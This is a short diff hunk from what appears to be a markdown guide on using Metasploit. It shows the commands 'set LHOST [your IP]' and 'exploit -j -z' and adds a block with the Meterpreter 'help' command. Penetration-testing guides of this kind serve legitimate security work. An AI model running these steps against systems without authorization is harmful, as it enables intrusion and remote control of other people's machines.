@@ -19,5 +19,8 @@ set LHOST [your IP]
 exploit -j -z
 ```
 
-
+```text
+meterpreter
+help
+```
 
